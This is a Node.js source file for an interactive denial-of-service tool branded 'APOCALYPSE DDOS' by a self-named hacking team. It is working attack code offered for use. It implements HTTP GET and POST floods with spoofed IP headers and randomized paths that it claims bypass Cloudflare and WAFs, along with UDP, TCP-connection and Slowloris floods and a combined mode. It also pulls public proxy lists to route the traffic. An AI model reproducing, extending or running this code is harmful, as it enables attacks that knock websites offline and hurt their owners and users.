import net from 'net';
import http from 'http';
import https from 'https';
import dgram from 'dgram';
import fs from 'fs';
import readline from 'readline';
import crypto from 'crypto';

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const c = { 
    red: '\x1b[38;2;255;0;0m', darkRed: '\x1b[38;2;139;0;0m', green: '\x1b[38;2;0;255;0m', 
    yellow: '\x1b[38;2;255;255;0m', cyan: '\x1b[38;2;0;255;255m', magenta: '\x1b[38;2;255;0;255m',
    gray: '\x1b[38;2;128;128;128m', reset: '\x1b[0m', bold: '\x1b[1m', blink: '\x1b[5m' 
};

console.log(`${c.red}${c.bold}
╔════════════════════════════════════════════════════════════════════════════╗
║  █████╗ ██╗  ██╗ ██████╗ ██╗     ██████╗ ██╗████████╗    ██████╗ ██████╗  ██████╗ ███████╗║
║ ██╔══██╗╚██╗██╔╝██╔═══██╗██║     ╚════██╗██║╚══██╔══╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝║
║ ███████║ ╚███╔╝ ██║   ██║██║      █████╔╝██║   ██║       ██║  ██║██████╔╝██║   ██║███████╗║
║ ██╔══██║ ██╔██╗ ██║   ██║██║     ██╔═══╝ ██║   ██║       ██║  ██║██╔══██╗██║   ██║╚════██║║
║ ██║  ██║██╔╝ ██╗╚██████╔╝███████╗███████╗██║   ██║       ██████╔╝██║  ██║╚██████╔╝███████║║
║ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝║
${c.magenta}║                    ◥𝗗𝗥𝟰𝗞𝟰𝟳𝗛◤ ◥𝗧𝗘𝗔𝗠◤ - ALXPLOIT                          ║
${c.red}${c.blink}║              🔥 APOCALYPSE DDOS - BYPASS CLOUDFLARE/WAF/LITESPEED 🔥            ║
${c.red}║                      💀 TOTAL ANNIHILATION | NO MERCY 💀                           ║
${c.reset}${c.red}╚════════════════════════════════════════════════════════════════════════════╝${c.reset}
`);

let proxies = [], active = false, stats = { total: 0, success: 0, failed: 0, packets: 0 }, bypass = 'auto', attackNum = 0;

const ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0','Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0','Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Chrome/120.0.0.0'];
const paths = ['/', '/wp-admin/admin-ajax.php', '/xmlrpc.php', '/index.php', '/login', '/api', '/.env', '/config.php', '/cdn-cgi/challenge-platform/h/g/flow'];

function loadProxies() {
    try { proxies = [...new Set(fs.readFileSync('proxy.txt','utf-8').split('\n').filter(l=>l.trim()&&!l.startsWith('#')))]; console.log(`${c.green}✓${c.reset} ${c.cyan}Loaded ${c.yellow}${proxies.length}${c.cyan} proxies${c.reset}\n`); } 
    catch(e) { console.log(`${c.yellow}⚠ No proxy.txt${c.reset}\n`); }
}

function downloadProxies() {
    console.log(`${c.cyan}📥 Downloading proxies...${c.reset}`);
    const https = require('https');
    let all = [], done = 0;
    ['https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt','https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt','https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt'].forEach(src=>{
        https.get(src,res=>{let d=''; res.on('data',ch=>d+=ch); res.on('end',()=>{all.push(...d.split('\n').filter(l=>l.trim())); done++; if(done===3){all=[...new Set(all)]; fs.writeFileSync('proxy.txt',all.join('\n')); console.log(`${c.green}✓ Downloaded ${all.length} proxies${c.reset}\n`); loadProxies();}});}).on('error',()=>done++);
    });
}

function getProxy() { return proxies.length ? proxies[Math.floor(Math.random()*proxies.length)] : null; }

function getHeaders() {
    return { 
        'User-Agent': ua[Math.floor(Math.random()*ua.length)], 
        'Accept': '*/*', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive',
        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        'X-Originating-IP': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
    };
}

function flood(target, duration, useProxy, method='GET') {
    const url = new URL(target), isHttps = url.protocol === 'https:', client = isHttps ? https : http;
    let localActive = true;
    const attack = () => {
        if(!localActive) return;
        const path = (bypass==='auto'?paths[Math.floor(Math.random()*paths.length)]:'/') + `?r=${crypto.randomBytes(8).toString('hex')}&t=${Date.now()}`;
        let opts = { hostname: url.hostname, port: url.port||(isHttps?443:80), path, headers: getHeaders(), method, rejectUnauthorized: false };
        if(useProxy && proxies.length) { const p = getProxy(); if(p){ const [h,pt]=p.split(':'); opts = { ...opts, host: h, port: parseInt(pt), path: target+path }; } }
        const req = client.request(opts, res => { stats.total++; if(res.statusCode>=200&&res.statusCode<400) stats.success++; else stats.failed++; res.resume(); if(localActive) attack(); });
        req.on('error', () => { stats.total++; stats.failed++; if(localActive) attack(); });
        req.setTimeout(3000, () => req.destroy()); req.end();
    };
    for(let i=0;i<800;i++) attack();
    setTimeout(() => localActive=false, duration*1000);
}

function udpFlood(target, duration) {
    const sock = dgram.createSocket('udp4'), msg = Buffer.from('X'.repeat(65500));
    let localActive = true;
    const send = () => { if(localActive) sock.send(msg,0,msg.length,80,target,()=>{ stats.packets++; if(localActive) send(); }); };
    for(let i=0;i<400;i++) send();
    setTimeout(() => localActive=false, duration*1000);
}

function tcpFlood(target, duration) {
    let localActive = true;
    const create = () => { if(!localActive) return; const sock = net.createConnection(80,target); sock.on('connect',()=>{ sock.write(`GET / HTTP/1.1\r\nHost: ${target}\r\nX-Forwarded-For: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}\r\n\r\n`); stats.total++; setTimeout(()=>sock.destroy(),50); }); sock.on('error',()=>sock.destroy()); if(localActive) setTimeout(create,8); };
    for(let i=0;i<800;i++) create();
    setTimeout(() => localActive=false, duration*1000);
}

function slowloris(target, duration) {
    let localActive = true;
    const sockets = [];
    for(let i=0;i<1500;i++){ const sock = net.createConnection(80,target); sock.on('connect',()=>{ sock.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n`); const iv = setInterval(()=>{ if(!localActive){ clearInterval(iv); sock.destroy(); return; } sock.write(`X-Header-${crypto.randomBytes(4).toString('hex')}: ${crypto.randomBytes(8).toString('hex')}\r\n`); },10000); sockets.push({sock,iv}); stats.total++; }); sock.on('error',()=>sock.destroy()); }
    setTimeout(() => localActive=false, duration*1000);
}

function start(target, method, duration, useProxy) {
    if(active){ console.log(`${c.red}⚠ Attack already running!${c.reset}\n`); return; }
    attackNum++; active=true; stats={total:0,success:0,failed:0,packets:0};
    console.log(`\n${c.red}${c.bold}╔════════════════════════════════════════════════════════════╗${c.reset}`);
    console.log(`${c.red}${c.bold}║              💀 APOCALYPSE ATTACK INITIATED 💀               ║${c.reset}`);
    console.log(`${c.red}${c.bold}╠════════════════════════════════════════════════════════════╣${c.reset}`);
    console.log(`${c.cyan}║  🎯 ${target.substring(0,55)}${c.reset}${' '.repeat(Math.max(0,60-target.length))}║`);
    console.log(`${c.cyan}║  ⚙️ ${method.toUpperCase()} | ⏱️ ${duration}s | 🔌 ${useProxy&&proxies.length?`YES(${proxies.length})`:'NO'} | 🛡️ ${bypass.toUpperCase()}${c.reset}${' '.repeat(15)}║`);
    console.log(`${c.cyan}║  💀 ATTACK #${attackNum} | 👤 ◥𝗗𝗥𝟰𝗞𝟰𝟳𝗛◤ ◥𝗧𝗘𝗔𝗠◤${c.reset}${' '.repeat(20)}║`);
    console.log(`${c.red}${c.bold}╚════════════════════════════════════════════════════════════╝${c.reset}\n`);
    const startTime = Date.now();
    if(method==='http') flood(target,duration,useProxy,'GET');
    else if(method==='post') flood(target,duration,useProxy,'POST');
    else if(method==='udp') udpFlood(target,duration);
    else if(method==='tcp') tcpFlood(target,duration);
    else if(method==='slow') slowloris(target,duration);
    else if(method==='all') { flood(target,duration,useProxy,'GET'); flood(target,duration,useProxy,'POST'); udpFlood(target,duration); tcpFlood(target,duration); slowloris(target,duration); }
    const iv = setInterval(()=>{ const e=(Date.now()-startTime)/1000; console.log(`${c.red}[${e.toFixed(0)}s]${c.reset} 📊 REQ:${stats.total} | ✅ OK:${stats.success} | ❌ FAIL:${stats.failed} | 📦 PKT:${stats.packets} | ⚡ RPS:${Math.round(stats.total/e)}`); },1000);
    setTimeout(()=>{ active=false; clearInterval(iv); const e=(Date.now()-startTime)/1000; console.log(`\n${c.green}✅ APOCALYPSE COMPLETED${c.reset} | ${c.yellow}TOTAL:${stats.total} | OK:${stats.success} | FAIL:${stats.failed} | RPS:${Math.round(stats.total/e)}${c.reset}\n${c.magenta}💀 TARGET ${target} HAS BEEN CRUSHED 💀${c.reset}\n`); rl.prompt(); },duration*1000);
}

function showMenu() {
    console.log(`
${c.red}${c.bold}╔════════════════════════════════════════════════════════════╗
║  ${c.yellow}💀 DARK MENU - APOCALYPSE EDITION ${c.red}                              ║
╠════════════════════════════════════════════════════════════╣
║  ${c.green}1. HTTP Flood      ${c.cyan}- Bypass Cloudflare/WAF/LiteSpeed        ║
║  ${c.green}2. POST Flood      ${c.cyan}- Bypass Cloudflare/WAF/LiteSpeed        ║
║  ${c.green}3. UDP Flood       ${c.cyan}- High bandwidth attack                  ║
║  ${c.green}4. TCP SYN Flood   ${c.cyan}- Raw connection flood                   ║
║  ${c.green}5. Slowloris       ${c.cyan}- Slow headers attack                    ║
║  ${c.green}6. ALL METHODS     ${c.red}- MAXIMUM DESTRUCTION                     ║
║  ${c.green}7. Download Proxies${c.cyan}- Update proxy list                       ║
║  ${c.green}8. Stop Attack     ${c.cyan}- Stop current attack                    ║
║  ${c.green}9. Exit            ${c.cyan}- Close tool                             ║
╠════════════════════════════════════════════════════════════╣
║  ${c.yellow}💀 COMMAND: attack <url> <method> <duration> <proxy>${c.red}          ║
║  ${c.yellow}💀 EXAMPLE: attack http://target.com all 60 yes${c.red}               ║
╚════════════════════════════════════════════════════════════╝${c.reset}
`);
}

loadProxies();
console.log(`${c.cyan}💀 Type 'menu' for commands | Bypass: Cloudflare/WAF/LiteSpeed Active 💀${c.reset}\n`);
rl.setPrompt(`${c.red}🔥${c.reset} ${c.magenta}APOCALYPSE>${c.reset} `);
rl.prompt();

rl.on('line', (input) => {
    const a = input.trim().split(' '), cmd = a[0].toLowerCase();
    if(cmd==='attack' && a.length>=4){
        const target = a[1], method = a[2].toLowerCase(), duration = parseInt(a[3]), useProxy = a[4]==='yes';
        if(isNaN(duration)) console.log(`${c.red}❌ Invalid duration${c.reset}\n`);
        else if(!['http','post','udp','tcp','slow','all'].includes(method)) console.log(`${c.red}❌ Invalid method${c.reset}\n`);
        else start(target, method, duration, useProxy);
    } else if(cmd==='stop') { active=false; console.log(`${c.red}🛑 Attack stopped by user${c.reset}\n`); }
    else if(cmd==='download-proxy') downloadProxies();
    else if(cmd==='menu'||cmd==='help') showMenu();
    else if(cmd==='exit') process.exit(0);
    rl.prompt();
});
